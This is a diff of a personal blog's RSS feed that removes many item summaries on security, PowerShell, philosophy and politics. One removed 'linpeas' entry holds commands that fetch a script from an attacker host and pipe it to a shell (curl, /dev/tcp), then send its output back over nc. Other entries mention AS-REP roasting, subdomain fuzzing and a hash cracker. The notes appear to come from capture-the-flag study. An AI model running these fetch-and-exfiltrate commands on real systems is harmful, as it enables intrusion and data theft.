@@ -8,69 +8,12 @@
     <language>en-us</language>
     <lastBuildDate>Sun, 29 May 2022 21:44:03 +0800</lastBuildDate><atom:link href="https://kdbed.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Abortion</title>
-      <link>https://kdbed.github.io/posts/abortion/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/abortion/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Abortion and the Supreme Court: Roe V Wade, Dobbs V Jackson, etc</title>
-      <link>https://kdbed.github.io/posts/roevwade/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/roevwade/</guid>
-      <description>Abortion and the Supreme Court Roe V Wade Basic Conclusions - Roe Drawing on the First, Fourth, Ninth, and Fourteenth Amendments, the Court said that the Constitution protects an individual’s “zones of privacy.” Citing earlier cases that ruled that contraception, marriage, and child rearing were activities included in these “zones of privacy,” the Court found that the zone was “broad enough to encompass a woman’s decision whether or not to terminate her pregnancy.</description>
-    </item>
-    
-    <item>
-      <title>Account Lockout - Splunk</title>
-      <link>https://kdbed.github.io/posts/20221006193807-account_lockout_splunk/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221006193807-account_lockout_splunk/</guid>
-      <description>Monitoring Active Directory account lockouts with Splunk
-index=wineventlog Account_Name=&amp;lt;&amp;lt;accountNameHere&amp;gt;&amp;gt;&amp;gt; (EventCode=4740 OR EventCode=4625 OR EventCode=644 OR EventCode=529 OR EventCode=675 OR EventCode=676 OR EventCode=681 OR EventCode=4771 OR EventCode=4770 OR EventCode=4768 OR EventCode=4776 OR EventCode=4777 OR EventCode=4725 OR EventCode=4723 OR EventCode=4724 OR EventCode=4767 OR EventCode=4800 OR EventCode=4801) | eval Account0=mvindex(Account_Name,0) | eval Account1=mvindex(Account_Name,1) | eval Account=case(EventCode==4624,Account1, EventCode==4625,Account1, EventCode==4648,Account1, EventCode==4722,Account1, EventCode==4723,Account1, EventCode==4724,Account1, EventCode==4725,Account1, EventCode==4738,Account1, EventCode==4740,Account1, EventCode==4767,Account1, EventCode==4768,Account0, EventCode==4769,Account0, EventCode==4771,Account0, EventCode==4770,Account0, EventCode==5140,Account0, EventCode==4778,Account0, EventCode==4779,Account0, EventCode==4800,Account0, EventCode==4801,Account0) | fillnull Value=&amp;#34;-&amp;#34; Account | eval ActionBy=case(EventCode==4725,Account0, EventCode==4722,src_user, EventCode==4767,src_user, EventCode==4723,src_user, EventCode==4724,src_user, EventCode==4738,src_user, EventCode==4794,src_user) | eval Time=strftime(_time, &amp;#34;%m/%d/%y %H:%M:%S&amp;#34;) | sort -_time | eval Caller_Machine=if(Caller_Machine_Name!</description>
-    </item>
-    
-    <item>
       <title>Active Directory</title>
-      <link>https://kdbed.github.io/posts/20221005124255-active_directory/</link>
+      <link>https://kdbed.github.io/posts/active_directory/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://kdbed.github.io/posts/20221005124255-active_directory/</guid>
+      <guid>https://kdbed.github.io/posts/active_directory/</guid>
       <description></description>
-    </item>
-    
-    <item>
-      <title>Active Scanning with Scapy</title>
-      <link>https://kdbed.github.io/posts/scapy_scanning/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/scapy_scanning/</guid>
-      <description>Scanning Networks with Scapy Nmap implements several types of scans and can be used to detect the versions of operating systems and services; it can also perform custom vulnerability scanning. Here we&amp;rsquo;ll implement a couple of simple scans using scapy in Python.
-SYN scan : A SYN scan sends a TCP SYN packet to a port and looks for a SYN/ACK packet in response. DNS scan : A DNS scan tests whether a DNS server is running on the target system.</description>
-    </item>
-    
-    <item>
-      <title>Algorithms</title>
-      <link>https://kdbed.github.io/posts/algorithms/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/algorithms/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>AS-REP Roasting</title>
-      <link>https://kdbed.github.io/posts/as_rep_roasting/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
-      <description>AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.
-Use the Impacket tool GetNPUsers.py to try to get a hash for each user</description>
     </item>
     
     <item>
@@ -83,157 +26,6 @@ Use the Impacket tool GetNPUsers.py to try to get a hash for each user</descript
     </item>
     
     <item>
-      <title>Birthday Attack</title>
-      <link>https://kdbed.github.io/posts/birthdayattack/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/birthdayattack/</guid>
-      <description>Birthday Attack The birthday attack is named after the birthday paradox. The name is based on fact that in a room with 23 people or more, the odds are greater than 50% that two will share the same birthday. Many find this counterintuitive, and the birthday paradox illustrates why many people’s instinct on probability (and risk) is wrong. You are not trying to match a specific birthday (such as yours); you are trying to match any birthday.</description>
-    </item>
-    
-    <item>
-      <title>C&#43;&#43; and Nix</title>
-      <link>https://kdbed.github.io/posts/cpp_proj_nix/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/cpp_proj_nix/</guid>
-      <description>Template Project in C++ using Nix Taken from this blog post.
-Creating a C++ project Create a sample C++ project with the following dependencies
-C++ compiler, of course. That might be GCC or Clang. Boost Poco The program does nothing more than printing what compiler it was built with and which versions of boost and poco it is linked against.
-Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include &amp;lt;boost/lexical_cast.</description>
-    </item>
-    
-    <item>
-      <title>Category Theory</title>
-      <link>https://kdbed.github.io/posts/category_theory/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/category_theory/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>ComptTIA Security&#43;</title>
-      <link>https://kdbed.github.io/posts/securityplus/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/securityplus/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Computer Science</title>
-      <link>https://kdbed.github.io/posts/computer_science/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/computer_science/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>DNS Zone Transfers</title>
-      <link>https://kdbed.github.io/posts/dnszonetransfers/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/dnszonetransfers/</guid>
-      <description>DNS Zone Transfers DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers. To avoid the need to edit information on multiple DNS servers, you can edit information on one server and use AXFR to copy information to other servers. However, if you do not protect your servers, malicious parties may use AXFR to get information about all your hosts.
-How DNS Works DNS (Domain Name System) is like an Internet phonebook.</description>
-    </item>
-    
-    <item>
-      <title>Dopamine</title>
-      <link>https://kdbed.github.io/posts/dopamine/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/dopamine/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Fileless Malware</title>
-      <link>https://kdbed.github.io/posts/fileless_malware/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/fileless_malware/</guid>
-      <description>What is Fileless Malware? Traditionally, antivirus and other endpoint security products have focused on files (executables) to detect and prevent malware. There are several advantages to this. Files can be hashed, queried in reputation services, examined by both static analysis and machine learning, and easily excluded for false detections.
-This is a problem for hackers: if the malware’s signature is detected two days after release, the attacker’s ROI (return on investment) may be significantly less than expected, or even negligible.</description>
-    </item>
-    
-    <item>
-      <title>Generative Effects: Orders and Galois Connections</title>
-      <link>https://kdbed.github.io/posts/generativeeffects/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/generativeeffects/</guid>
-      <description>Introduction From An Invitation to Applied Category Theory - Seven Sketches in Compositionality &amp;ndash; Fong/Spivak
-A wide variety of situations exhibit something called compositionality &amp;ndash; wherein systems or relationships can be combined to form new systems or relationships. Category-theoretic constructs can be used to describe the compositionality in such situations. A structural approach to modeling with Category Theory : introduction.
-More Than the Sum of Their Parts </description>
-    </item>
-    
-    <item>
-      <title>Greenhouse Gas Emissions</title>
-      <link>https://kdbed.github.io/posts/greenhouseemissions/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/greenhouseemissions/</guid>
-      <description>Raw Numbers Fifty-one billion is how many tons of greenhouse gases the world typically adds to the atmosphere every year. &amp;ndash;Bill Gates, How to Avoid a Climate Disaster (2021)</description>
-    </item>
-    
-    <item>
-      <title>Happiness</title>
-      <link>https://kdbed.github.io/posts/happiness/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/happiness/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Haskell - Org Test</title>
-      <link>https://kdbed.github.io/posts/haskelltest/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/haskelltest/</guid>
-      <description>Map import Control.Monad :{ map (\x -&amp;gt; x*x + x + 1) [1..10] :} [3,7,13,21,31,43,57,73,91,111] </description>
-    </item>
-    
-    <item>
-      <title>IdentityIQEssentialsIntroduction</title>
-      <link>https://kdbed.github.io/posts/identityiqessentialsintroduction/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/identityiqessentialsintroduction/</guid>
-      <description>Introduction Reading data: all systems from which data is read are called applications. Identity cubes created when aggregating accounts from an authoritative application (system of record), e.g., HR system or AD. Business modeling Governance Process Provisioning Process : User Request; Lifecycle event </description>
-    </item>
-    
-    <item>
-      <title>Impacket</title>
-      <link>https://kdbed.github.io/posts/impacket/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/impacket/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Information Security</title>
-      <link>https://kdbed.github.io/posts/information_security/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/information_security/</guid>
-      <description>Computer Science</description>
-    </item>
-    
-    <item>
-      <title>Internet Security Association and Key Management Protocol (ISAKMP)</title>
-      <link>https://kdbed.github.io/posts/isakmp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/isakmp/</guid>
-      <description>Internet Security Association and Key Management Protocol (ISAKMP) Wiki Overview ISAKMP defines the procedures for authenticating a communicating peer, creation and management of Security Associations, key generation techniques and threat mitigation (e.g. denial of service and replay attacks). As a framework,[1] ISAKMP typically utilizes IKE for key exchange, although other methods have been implemented such as Kerberized Internet Negotiation of Keys. A Preliminary SA is formed using this protocol; later a fresh keying is done.</description>
-    </item>
-    
-    <item>
       <title>Intro to Pwntools - TryHackMe</title>
       <link>https://kdbed.github.io/posts/introtopwntools/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -242,7 +34,7 @@ More Than the Sum of Their Parts </description>
       <description>Basics of Binary Analysis
 Intro to Pwntools Source materials here dizmascyberlabs Install gdb-pwndbg-peda-gef
 Checksec Same source code, compiled with different protections in place:
-1 checksec checksec/intro2pwn2 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 1 checksec checksec/intro2pwn1 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1&amp;#39; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RELRO = Relocation Read-Only; makes the global offset table (GOT) read-only after the linker resolves functions to it.</description>
+1 checksec checksec/intro2pwn2 1 checksec checksec/intro2pwn1 RELRO = Relocation Read-Only; makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack Stack Canaries = tokens placed after a stack to detect a stack overflow.</description>
     </item>
     
     <item>
@@ -255,77 +47,12 @@ Checksec Same source code, compiled with different protections in place:
     </item>
     
     <item>
-      <title>Kerberos</title>
-      <link>https://kdbed.github.io/posts/kerberos/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/kerberos/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>linpeas</title>
-      <link>https://kdbed.github.io/posts/linpeas/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/linpeas/</guid>
-      <description>Execution: Run from memory and send back to attacker:
-# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim </description>
-    </item>
-    
-    <item>
-      <title>Malware</title>
-      <link>https://kdbed.github.io/posts/malware/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/malware/</guid>
-      <description>Information Security</description>
-    </item>
-    
-    <item>
-      <title>Marx</title>
-      <link>https://kdbed.github.io/posts/marx/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/marx/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Nietzsche</title>
-      <link>https://kdbed.github.io/posts/nietzsche/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/nietzsche/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Nietzsche and Stoicism</title>
-      <link>https://kdbed.github.io/posts/nietzsche_and_stoicism/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/nietzsche_and_stoicism/</guid>
-      <description>Nietzsche and Stoicism Resolution of contradictions After describing the Stoics’ essential psychological characteristics, Nietzsche advances two obscure but critical remarks. First, he questions whether the Stoics’ attainment of their ethical ideal is significant on the grounds that the decision to adopt Stoic therapy is determined in advance by one’s character. Second, he rebukes the Stoics for underestimating the worth of pain and passion, and for the fatalistic acceptance of life that their therapy produces.</description>
-    </item>
-    
-    <item>
       <title>NX</title>
       <link>https://kdbed.github.io/posts/nx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://kdbed.github.io/posts/nx/</guid>
       <description>Binary Analysis</description>
-    </item>
-    
-    <item>
-      <title>Org Mode - Python/Jupyter Example</title>
-      <link>https://kdbed.github.io/posts/orgpythonjupyter/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/orgpythonjupyter/</guid>
-      <description>Create a Session Initialize server with org-babel-exp-src-block. Afterwards, &amp;lsquo;Enter&amp;rsquo; in the sourceblock will execute.
-print(&amp;#39;ello, world!&amp;#39;) Create a plot import matplotlib.pyplot as plt fig, ax = plt.subplots() ax.plot([1, 2, 3, 4], [1, 4, 2, 3]) pass Ocaml print_string &amp;#34;Hello world!\n&amp;#34; </description>
     </item>
     
     <item>
@@ -338,15 +65,6 @@ print(&amp;#39;ello, world!&amp;#39;) Create a plot import matplotlib.pyplot as 
     </item>
     
     <item>
-      <title>Philosophy</title>
-      <link>https://kdbed.github.io/posts/20221010191100-philosophy/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221010191100-philosophy/</guid>
-      <description></description>
-    </item>
-    
-    <item>
       <title>PIE</title>
       <link>https://kdbed.github.io/posts/pie/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -356,101 +74,22 @@ print(&amp;#39;ello, world!&amp;#39;) Create a plot import matplotlib.pyplot as 
     </item>
     
     <item>
-      <title>Political Science</title>
-      <link>https://kdbed.github.io/posts/20221010191047-political_science/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221010191047-political_science/</guid>
-      <description>Philosophy</description>
-    </item>
-    
-    <item>
-      <title>Politics</title>
-      <link>https://kdbed.github.io/posts/20221010191009-politics/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221010191009-politics/</guid>
-      <description>Political Science</description>
-    </item>
-    
-    <item>
       <title>Powershell</title>
-      <link>https://kdbed.github.io/posts/20221004204210-powershell/</link>
+      <link>https://kdbed.github.io/posts/powershell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://kdbed.github.io/posts/20221004204210-powershell/</guid>
+      <guid>https://kdbed.github.io/posts/powershell/</guid>
       <description></description>
-    </item>
-    
-    <item>
-      <title>PowerShell</title>
-      <link>https://kdbed.github.io/posts/20221006200600-powershell/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221006200600-powershell/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>PowerShell - Classes</title>
-      <link>https://kdbed.github.io/posts/20221006200406-powershell_classes/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221006200406-powershell_classes/</guid>
-      <description>PowerShell - Classes Introduction PowerShell is an object-oriented language. When you run commands, see the output on your screen, those are objects.
-Skeleton of a class called student:
-class student { } Classes have properties that look like parameters that are attributes that describe that class. The example below shows a class called student with two properties; FirstName and LastName.
-When you define a property, you should always define a type that sets a specific schema for what property values can hold.</description>
-    </item>
-    
-    <item>
-      <title>PowerShell - Clipboard to Array</title>
-      <link>https://kdbed.github.io/posts/20221006195312-powershell_clipboard_to_array/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221006195312-powershell_clipboard_to_array/</guid>
-      <description>(Get-Clipboard) -split &amp;#39;\t|\r?\n&amp;#39; </description>
     </item>
     
     <item>
       <title>PowerShell - Get Domain Controllers in Forest</title>
-      <link>https://kdbed.github.io/posts/20221005124124-powershell_get_domain_controllers_in_forest/</link>
+      <link>https://kdbed.github.io/posts/powershell_get_domain_controllers_in_forest/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://kdbed.github.io/posts/20221005124124-powershell_get_domain_controllers_in_forest/</guid>
+      <guid>https://kdbed.github.io/posts/powershell_get_domain_controllers_in_forest/</guid>
       <description>To list all of the domain controllers in an Active Directory forest:
 (Get-ADForest).Domains | %{ Get-ADDomainController -Filter * -Server $_ }| Format-Table -Property Name,ComputerObjectDN,Domain,Forest,IPv4Address,OperatingSystem,OperatingSystemVersion </description>
-    </item>
-    
-    <item>
-      <title>PowerShell - Log Function</title>
-      <link>https://kdbed.github.io/posts/20221010211227-powershell_log_function/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221010211227-powershell_log_function/</guid>
-      <description>Log Function for PowerShell function Write-Log { [CmdletBinding()] param( [Parameter()] [ValidateNotNullOrEmpty()] [string]$Message, [Parameter()] [ValidateNotNullOrEmpty()] [ValidateSet(&amp;#39;Information&amp;#39;,&amp;#39;Warning&amp;#39;,&amp;#39;Error&amp;#39;)] [string]$Severity = &amp;#39;Information&amp;#39; ) [pscustomobject]@{ Time = (Get-Date -f g) Message = $Message Severity = $Severity } | Export-Csv -Path &amp;#34;$env:Temp\LogFile.csv&amp;#34; -Append -NoTypeInformation } From : ATA</description>
-    </item>
-    
-    <item>
-      <title>PowerShell - Script Encryption</title>
-      <link>https://kdbed.github.io/posts/20221010201948-powershell_script_encryption/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221010201948-powershell_script_encryption/</guid>
-      <description>Encrypt PowerShell Scripts Function to obfuscate code containing sensitive data:
-function Encrypt-Script($path, $destination) { $script = Get-Content $path | Out-String $secure = ConvertTo-SecureString $script -asPlainText -force $export = $secure | ConvertFrom-SecureString Set-Content $destination $export &amp;#34;Script &amp;#39;$path&amp;#39; has been encrypted as &amp;#39;$destination&amp;#39;&amp;#34; } function Execute-EncryptedScript($path) { trap { &amp;#34;Decryption failed&amp;#34;; break } $raw = Get-Content $path $secure = ConvertTo-SecureString $raw $helper = New-Object system.Management.Automation.PSCredential(&amp;#34;test&amp;#34;, $secure) $plain = $helper.GetNetworkCredential().Password Invoke-Expression $plain } From: idera</description>
-    </item>
-    
-    <item>
-      <title>Quotes</title>
-      <link>https://kdbed.github.io/posts/quotes/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/quotes/</guid>
-      <description>Quotes Quote 1 - Marx You would be wrong if you thought that I love books. I am a machine condemned to devour them in order to vomit them up in a new form, like manure on the soil of history.
-— Marx in a letter to his daughter Laura, 1868
-Quote 2 &amp;ldquo;Meet these two here,&amp;rdquo; the man said. &amp;ldquo;Ask them if they&amp;rsquo;ve got a Mississippi credit card.&amp;rdquo;
-&amp;ldquo;Oh, I know that one,&amp;rdquo; Ruthie explaimed cheerfully.</description>
     </item>
     
     <item>
@@ -463,105 +102,12 @@ Quote 2 &amp;ldquo;Meet these two here,&amp;rdquo; the man said. &amp;ldquo;Ask 
     </item>
     
     <item>
-      <title>S_MIME</title>
-      <link>https://kdbed.github.io/posts/s_mime/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/s_mime/</guid>
-      <description>S/MIME ComptTIA Security+ </description>
-    </item>
-    
-    <item>
-      <title>sha1</title>
-      <link>https://kdbed.github.io/posts/sha1/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/sha1/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>sha1Cracker</title>
-      <link>https://kdbed.github.io/posts/sha1cracker/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/sha1cracker/</guid>
-      <description>Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; { let args: Vec&amp;lt;String&amp;gt; = env::args().collect(); if args.len() != 3 { println!(&amp;#34;Usage:&amp;#34;); println!(&amp;#34;sha1_cracker: &amp;lt;wordlist.txt&amp;gt; &amp;lt;sha1_hash&amp;gt;&amp;#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(&amp;#34;sha1 hash is not valid.&amp;#34;.into()); } let wordlist_file = File::open(&amp;amp;args[1])?; let reader = BufReader::new(&amp;amp;wordlist_file); for line in reader.</description>
-    </item>
-    
-    <item>
-      <title>SMTPS</title>
-      <link>https://kdbed.github.io/posts/smtps/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/smtps/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Splunk</title>
-      <link>https://kdbed.github.io/posts/splunk/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/splunk/</guid>
-      <description></description>
-    </item>
-    
-    <item>
       <title>Stack Canaries</title>
       <link>https://kdbed.github.io/posts/stack_canaries/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://kdbed.github.io/posts/stack_canaries/</guid>
       <description>https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/</description>
-    </item>
-    
-    <item>
-      <title>Subdomain Enumeration</title>
-      <link>https://kdbed.github.io/posts/subdomainenumeration/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/subdomainenumeration/</guid>
-      <description>From DNS dig +nocmd trick.htb axfr +noall +answer @trick.htb WFuzz In case the subdomain has a certain naming convention (Trick/HTB):
-sed &amp;#39;s/^/preprod-/&amp;#39; subdomains-top1million-110000.txt Then use wfuzz:
-sudo wfuzz -c -f out -w wordlist -u &amp;#34;http://trick.htb&amp;#34; -H &amp;#34;Host: FUZZ.trick.htb&amp;#34; --hw 475 </description>
-    </item>
-    
-    <item>
-      <title>TODO</title>
-      <link>https://kdbed.github.io/posts/todo/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/todo/</guid>
-      <description>TODO Complete Summer Yard Work TODO Burn outstanding refuse TODO Chainsaw fallen biggies TODO Clear pricks TODO Windows and Doors TODO Schedule Professional Assessment TODO Fix Garage Door TODO Send baby ABCs to Austin TODO Basement TODO Mattress TODO Trash TODO seal bathtub TODO nicotine test TODO quit TODO bloodwork </description>
-    </item>
-    
-    <item>
-      <title>Trump - Policies and Actions</title>
-      <link>https://kdbed.github.io/posts/20221010190736-trump_policies_and_actions/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20221010190736-trump_policies_and_actions/</guid>
-      <description>An analysis of the coherence &amp;ndash; or lack thereof &amp;ndash; of Trump&amp;rsquo;s policies and politics, along with general remarks on what he did while in office.
-Changes in American Policy Many Americans will remember President Donald Trump&amp;rsquo;s presidency as a four-yearlong storm of tweets, rallies and on-air rants that ended in a mob riot and historic second impeachment. But there was more to the Trump presidency than attention-hogging political drama and conflict; often unnoticed, Trump and his administration actually did succeed in changing some of the ways Washington works.</description>
-    </item>
-    
-    <item>
-      <title>wfuzz</title>
-      <link>https://kdbed.github.io/posts/wfuzz/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/wfuzz/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>words</title>
-      <link>https://kdbed.github.io/posts/20220824081229-words/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/20220824081229-words/</guid>
-      <description>susurrus</description>
     </item>
     
     <item>
@@ -574,15 +120,6 @@ Changes in American Policy Many Americans will remember President Donald Trump&a
 XOR is a &amp;lsquo;programmable inverter&amp;rsquo;: one input bit decides whether to invert the other input bit or to just pass it through unchanged. &amp;lsquo;Inverting&amp;rsquo; bits is also called &amp;lsquo;flipping&amp;rsquo; bits.
 \(X = A \bigoplus B\)
 Properties </description>
-    </item>
-    
-    <item>
-      <title>Z3 Basics</title>
-      <link>https://kdbed.github.io/posts/z3_basics/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/z3_basics/</guid>
-      <description></description>
     </item>
     
   </channel>
